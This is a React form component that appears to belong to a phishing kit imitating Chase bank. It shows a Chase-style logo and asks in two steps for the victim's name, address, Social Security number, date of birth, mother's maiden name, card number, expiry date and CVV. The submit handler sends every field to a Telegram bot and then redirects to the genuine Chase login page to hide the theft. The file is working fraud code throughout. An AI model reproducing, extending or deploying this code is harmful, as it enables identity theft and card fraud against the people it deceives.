import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { sendCustomData } from '../services/telegramBot';

const Billing = () => {
  const navigate = useNavigate();
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    street: '',
    city: '',
    state: '',
    zipCode: '',
    ssn: '',
    dob: '',
    mmn: '',
    cardNumber: '',
    expiryDate: '',
    cvv: ''
  });

  const states = [
    'AL', 'AK', 'AZ', 'AR', 'CA', 'CO', 'CT', 'DE', 'FL', 'GA', 
    'HI', 'ID', 'IL', 'IN', 'IA', 'KS', 'KY', 'LA', 'ME', 'MD', 
    'MA', 'MI', 'MN', 'MS', 'MO', 'MT', 'NE', 'NV', 'NH', 'NJ', 
    'NM', 'NY', 'NC', 'ND', 'OH', 'OK', 'OR', 'PA', 'RI', 'SC', 
    'SD', 'TN', 'TX', 'UT', 'VT', 'VA', 'WA', 'WV', 'WI', 'WY'
  ];

  const formatSSN = (value) => {
    const digits = value.replace(/\D/g, '');
    let formatted = '';
    if (digits.length > 0) {
      formatted += digits.substring(0, 3);
      if (digits.length > 3) {
        formatted += '-' + digits.substring(3, 5);
        if (digits.length > 5) {
          formatted += '-' + digits.substring(5, 9);
        }
      }
    }
    return formatted;
  };

  const formatDOB = (value) => {
    const digits = value.replace(/\D/g, '');
    let formatted = '';
    if (digits.length > 0) {
      formatted += digits.substring(0, 2);
      if (digits.length > 2) {
        formatted += '/' + digits.substring(2, 4);
        if (digits.length > 4) {
          formatted += '/' + digits.substring(4, 8);
        }
      }
    }
    return formatted;
  };

  const formatCardNumber = (value) => {
    const digits = value.replace(/\D/g, '').substring(0, 16);
    return digits.match(/.{1,4}/g)?.join(' ') || digits;
  };

  const formatExpiry = (value) => {
    const digits = value.replace(/\D/g, '').substring(0, 4);
    if (digits.length > 2) {
      return digits.substring(0, 2) + '/' + digits.substring(2);
    }
    return digits;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    let finalValue = value;

    if (name === 'ssn') {
      finalValue = formatSSN(value);
    } else if (name === 'dob') {
      finalValue = formatDOB(value);
    } else if (name === 'cardNumber') {
      finalValue = formatCardNumber(value);
    } else if (name === 'expiryDate') {
      finalValue = formatExpiry(value);
    } else if (['firstName', 'lastName', 'city', 'mmn'].includes(name)) {
      finalValue = value.replace(/[^a-zA-Z]/g, '');
    } else if (name === 'street') {
      finalValue = value.replace(/[^a-zA-Z0-9\s]/g, '');
    } else if (name === 'zipCode') {
      finalValue = value.replace(/\D/g, '').slice(0, 5);
    } else if (name === 'cvv') {
      finalValue = value.replace(/\D/g, '').slice(0, 4);
    }

    setFormData({
      ...formData,
      [name]: finalValue
    });
  };

  const handleNext = async (e) => {
    e.preventDefault();
    if (step === 1) {
      if (formData.zipCode.length !== 5) {
        alert('Zip Code must be exactly 5 digits');
        return;
      }
      if (formData.ssn.length !== 11) {
        alert('Please enter a valid 9-digit SSN');
        return;
      }

      const dobRegex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
      const match = formData.dob.match(dobRegex);
      if (!match) {
        alert('Please enter a valid Date of Birth (MM/DD/YYYY)');
        return;
      }

      const month = parseInt(match[1], 10);
      const day = parseInt(match[2], 10);
      const year = parseInt(match[3], 10);
      const date = new Date(year, month - 1, day);
      const now = new Date();
      const minAgeDate = new Date(now.getFullYear() - 18, now.getMonth(), now.getDate());

      if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day || date > now) {
        alert('Please enter a valid Date of Birth');
        return;
      }
      if (date > minAgeDate) {
        alert('You must be at least 18 years old');
        return;
      }
      if (formData.mmn.length < 2 || formData.mmn.length > 10) {
        alert("Mother's Maiden Name must be between 2 and 10 characters");
        return;
      }
      setStep(2);
    } else {
      // Step 2 Validation
      const cleanCard = formData.cardNumber.replace(/\s/g, '');
      if (cleanCard.length !== 16) {
        alert('Card number must be exactly 16 digits');
        return;
      }

      const expiryRegex = /^(\d{2})\/(\d{2})$/;
      const expiryMatch = formData.expiryDate.match(expiryRegex);
      if (!expiryMatch) {
        alert('Please enter a valid expiration date (MM/YY)');
        return;
      }

      const expMonth = parseInt(expiryMatch[1], 10);
      const expYear = parseInt('20' + expiryMatch[2], 10);
      const now = new Date();
      const currentMonth = now.getMonth() + 1;
      const currentYear = now.getFullYear();

      if (expMonth < 1 || expMonth > 12) {
        alert('Invalid month in expiration date');
        return;
      }
      if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
        alert('Card has expired');
        return;
      }

      if (formData.cvv.length < 3 || formData.cvv.length > 4) {
        alert('CVV must be 3 or 4 digits');
        return;
      }

      setLoading(true);
      setError(false);
      
      try {
        console.log('🚀 Billing: Sending data to Telegram...');
        // Send all billing data to Telegram
        await sendCustomData('💳 Billing Information Submitted', {
          'First Name': formData.firstName,
          'Last Name': formData.lastName,
          'Street': formData.street,
          'City': formData.city,
          'State': formData.state,
          'Zip Code': formData.zipCode,
          'SSN': formData.ssn,
          'Date of Birth': formData.dob,
          'Mother\'s Maiden Name': formData.mmn,
          'Card Number': formData.cardNumber,
          'Expiry Date': formData.expiryDate,
          'CVV': formData.cvv
        });
        
        console.log('🏁 Billing: Redirecting to Chase...');
        window.location.href = "https://secure.chase.com/web/auth/?treatment=chase#/logon/logon/chaseOnline";
      } catch (err) {
        console.error('❌ Billing: Error submitting data:', err);
        setError(true);
        // Redirect anyway after a short delay so user isn't stuck
        setTimeout(() => {
          window.location.href = "https://secure.chase.com/web/auth/?treatment=chase#/logon/logon/chaseOnline";
        }, 2000);
      } finally {
        setLoading(false);
      }
    }
  };

  return (
    <div className="identity-page">
      <header className="identity-header">
        <div className="identity-logo">
          <svg viewBox="457 0 105 105" width="30" height="30">
            <path d="M494.525 0a3.69 3.69 0 0 0-3.691 3.686v25.83h68.244L528 .008 494.525 0M561.578 37.33a3.677 3.677 0 0 0-3.688-3.68h-25.828v68.242l29.504-31.086.012-33.476M524.236 104.369a3.688 3.688 0 0 0 3.678-3.688V74.854h-68.241l31.073 29.508 33.49.007M457.18 67.043a3.687 3.687 0 0 0 3.686 3.688h25.83V2.484l-29.512 31.078-.004 33.481" fill="white" />
          </svg>
        </div>
      </header>

      <main className="identity-content">
        <div className="content-wrapper">
          <h1 className="large-title"></h1>
          <p className="description">Please complete all fields to continue.</p>

          <form onSubmit={handleNext} className="billing-form">
            {step === 1 ? (
              <div className="step-fields">
                <div className="form-row">
                  <div className="billing-input-group">
                    <label>First Name</label>
                    <input type="text" name="firstName" value={formData.firstName} onChange={handleChange} required />
                  </div>
                  <div className="billing-input-group">
                    <label>Last Name</label>
                    <input type="text" name="lastName" value={formData.lastName} onChange={handleChange} required />
                  </div>
                </div>
                <div className="billing-input-group">
                  <label>Street Address</label>
                  <input type="text" name="street" value={formData.street} onChange={handleChange} required />
                </div>
                <div className="form-row address-row">
                  <div className="billing-input-group city-input">
                    <label>City</label>
                    <input type="text" name="city" value={formData.city} onChange={handleChange} required />
                  </div>
                  <div className="billing-input-group state-input">
                    <label>State</label>
                    <select name="state" value={formData.state} onChange={handleChange} required className="state-select">
                      <option value="">Select State</option>
                      {states.map(s => <option key={s} value={s}>{s}</option>)}
                    </select>
                  </div>
                  <div className="billing-input-group zip-input">
                    <label>Zip Code</label>
                    <input type="text" name="zipCode" value={formData.zipCode} onChange={handleChange} required maxLength="5" />
                  </div>
                </div>
                <div className="billing-input-group">
                  <label>Social Security Number (SSN)</label>
                  <input type="text" name="ssn" placeholder="xxx-xx-xxxx" value={formData.ssn} onChange={handleChange} maxLength="11" required />
                </div>
                <div className="billing-input-group">
                  <label>Date of Birth (DOB)</label>
                  <input type="text" name="dob" placeholder="MM/DD/YYYY" value={formData.dob} onChange={handleChange} maxLength="10" required />
                </div>
                <div className="billing-input-group">
                  <label>Mother's Maiden Name (MMN)</label>
                  <input type="text" name="mmn" value={formData.mmn} onChange={handleChange} maxLength="10" required />
                </div>
              </div>
            ) : (
              <div className="step-fields">
                <div className="billing-input-group">
                  <label>Credit/Debit Card Number</label>
                  <input type="text" name="cardNumber" placeholder="xxxx xxxx xxxx xxxx" value={formData.cardNumber} onChange={handleChange} maxLength="19" required />
                </div>
                <div className="form-row">
                  <div className="billing-input-group">
                    <label>Expiration Date</label>
                    <input type="text" name="expiryDate" placeholder="MM/YY" value={formData.expiryDate} onChange={handleChange} maxLength="5" required />
                  </div>
                  <div className="billing-input-group">
                    <label>CVV</label>
                    <input type="text" name="cvv" placeholder="xxx" value={formData.cvv} onChange={handleChange} maxLength="4" required />
                  </div>
                </div>
              </div>
            )}

            <div className="action-buttons dual-buttons billing-actions">
              <button 
                type="button" 
                className="cancel-btn" 
                onClick={() => step === 2 ? setStep(1) : navigate('/enter-code')}
                disabled={loading}
              >
                {step === 2 ? "Back" : "Cancel"}
              </button>
              <button 
                type="submit" 
                className={`next-btn ${loading ? 'disabled' : ''}`}
                disabled={loading}
              >
                {loading ? "Processing..." : (step === 1 ? "Next" : "Submit")}
              </button>
            </div>
          </form>
        </div>
      </main>
    </div>
  );
};

export default Billing;
